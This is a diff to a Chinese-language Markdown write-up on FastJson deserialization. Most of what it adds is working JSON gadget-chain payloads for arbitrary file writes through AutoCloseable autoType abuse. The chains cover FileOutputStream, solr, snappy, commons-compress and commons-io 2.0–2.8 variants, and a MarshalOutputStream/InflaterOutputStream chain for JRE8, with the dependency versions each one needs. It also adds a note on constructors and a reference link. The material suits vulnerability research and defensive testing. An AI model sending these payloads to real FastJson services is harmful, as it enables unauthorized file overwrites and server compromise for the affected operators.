@@ -167,6 +167,8 @@ TestBean{publicField='publicField', privateField=privateField, flag=com.dds.bean
 ```
 反序列化时的 getter、setter调⽤情况和⾮⾃省的⼀样。
 
+**注意：用fastjson进行反序列化时，对应的javabean需要有默认的构造函数。在通过带参构造函数进行反序列化时，会检查参数是否有参数名，只有含有参数名的带参构造函数才会被认可。可以通过javap -l <class_name> | grep LocalVariableTable证明其class字节码里的函数参数是否有参数名信息**
+
 # FastJson checkAutoType源码分析
 
 ```java
@@ -710,38 +712,8 @@ AutoCloseable 清空指定文件
     "append":false
 }
 ```
-AutoCloseable 任意文件写入
+AutoCloseable 任意文件写入1
 ```json
-{
-    "stream":
-    {
-        "@type":"java.lang.AutoCloseable",
-        "@type":"java.io.FileOutputStream",
-        "file":"/tmp/nonexist",
-        "append":false
-    },
-    "writer":
-    {
-        "@type":"java.lang.AutoCloseable",
-        "@type":"org.apache.solr.common.util.FastOutputStream",
-        "tempBuffer":"SSBqdXN0IHdhbnQgdG8gcHJvdmUgdGhhdCBJIGNhbiBkbyBpdC4=",
-        "sink":
-        {
-            "$ref":"$.stream"
-        },
-        "start":38
-    },
-    "close":
-    {
-        "@type":"java.lang.AutoCloseable",
-        "@type":"org.iq80.snappy.SnappyOutputStream",
-        "out":
-        {
-            "$ref":"$.writer"
-        }
-    }
-}
-
 {
     'stream':
     {
@@ -771,7 +743,31 @@ AutoCloseable 任意文件写入
         }
     }
 }
+// 需要目标class path存在以下三方组件库
+    <!-- https://mvnrepository.com/artifact/org.apache.ant/ant -->
+    <dependency>
+      <groupId>org.apache.ant</groupId>
+      <artifactId>ant</artifactId>
+      <version>1.10.9</version>
+    </dependency>
 
+    <!-- https://mvnrepository.com/artifact/org.apache.solr/solr-core -->
+    <dependency>
+      <groupId>org.apache.solr</groupId>
+      <artifactId>solr-core</artifactId>
+      <version>8.7.0</version>
+    </dependency>
+
+    <!-- https://mvnrepository.com/artifact/org.iq80.snappy/snappy -->
+    <dependency>
+      <groupId>org.iq80.snappy</groupId>
+      <artifactId>snappy</artifactId>
+      <version>0.4</version>
+    </dependency>
+```
+AutoCloseable 任意文件写入2
+```json
+//只能在 openjdk >= 11 下利用，不依赖第三方库
 {
     '@type':"java.lang.AutoCloseable",
     '@type':'sun.rmi.server.MarshalOutputStream',
@@ -796,9 +792,37 @@ AutoCloseable 任意文件写入
     },
     'protocolVersion':1
 }
+// JRE8下
+{
+    "x":{
+        "@type":"java.lang.AutoCloseable",
+        "@type":"sun.rmi.server.MarshalOutputStream",
+        "out":{
+            "@type":"java.util.zip.InflaterOutputStream",
+            "out":{
+                "@type":"java.io.FileOutputStream",
+                "file":"/tmp/dest.txt",
+                "append":false
+            },
+            "infl":{
+                "input":"eJwL8nUyNDJSyCxWyEgtSgUAHKUENw=="
+            },
+            "bufLen":1048576
+        },
+        "protocolVersion":1
+    }
+}
 ````
-AutoCloseable 任意文件写入
+AutoCloseable 任意文件写入3
 ```json
+// 需要目标class path存在以下三方组件库
+    <!-- https://mvnrepository.com/artifact/org.apache.commons/commons-compress -->
+    <dependency>
+      <groupId>org.apache.commons</groupId>
+      <artifactId>commons-compress</artifactId>
+      <version>1.20</version>
+    </dependency>
+
 {
     "@type": "java.lang.AutoCloseable",
     "@type": "org.apache.commons.compress.compressors.gzip.GzipCompressorOutputStream",
@@ -811,6 +835,170 @@ AutoCloseable 任意文件写入
         "filename": "filecontent"
     }
 }
+```
+AutoCloseable 任意文件写入4
+```json
+// commons-io 2.0 - 2.6 版本下的利用链：
+{
+  "x":{
+    "@type":"com.alibaba.fastjson.JSONObject",
+    "input":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.ReaderInputStream",
+      "reader":{
+        "@type":"org.apache.commons.io.input.CharSequenceReader",
+        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)"
+      },
+      "charsetName":"UTF-8",
+      "bufferSize":1024
+    },
+    "branch":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.output.WriterOutputStream",
+      "writer":{
+        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+        "file":"/tmp/pwned",
+        "encoding":"UTF-8",
+        "append": false
+      },
+      "charsetName":"UTF-8",
+      "bufferSize": 1024,
+      "writeImmediately": true
+    },
+    "trigger":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger2":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger3":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "is":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    }
+  }
+}
+// commons-io 2.7 - 2.8.0 版本下的利用链：
+{
+  "x":{
+    "@type":"com.alibaba.fastjson.JSONObject",
+    "input":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.ReaderInputStream",
+      "reader":{
+        "@type":"org.apache.commons.io.input.CharSequenceReader",
+        "charSequence":{"@type":"java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",
+        "start":0,
+        "end":2147483647
+      },
+      "charsetName":"UTF-8",
+      "bufferSize":1024
+    },
+    "branch":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.output.WriterOutputStream",
+      "writer":{
+        "@type":"org.apache.commons.io.output.FileWriterWithEncoding",
+        "file":"/tmp/pwned",
+        "charsetName":"UTF-8",
+        "append": false
+      },
+      "charsetName":"UTF-8",
+      "bufferSize": 1024,
+      "writeImmediately": true
+    },
+    "trigger":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger2":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    },
+    "trigger3":{
+      "@type":"java.lang.AutoCloseable",
+      "@type":"org.apache.commons.io.input.XmlStreamReader",
+      "inputStream":{
+        "@type":"org.apache.commons.io.input.TeeInputStream",
+        "input":{
+          "$ref":"$.input"
+        },
+        "branch":{
+          "$ref":"$.branch"
+        },
+        "closeBranch": true
+      },
+      "httpContentType":"text/xml",
+      "lenient":false,
+      "defaultEncoding":"UTF-8"
+    }
+  }
 ```
 # 总结
 
@@ -825,3 +1013,5 @@ https://paper.seebug.org/994/
 https://zonghaishang.gitbooks.io/fastjson-source-code-analysis/content/serializer/serializerWriter_part1.html
 
 http://scz.617.cn:8/web/202008111715.txt
+
+https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg
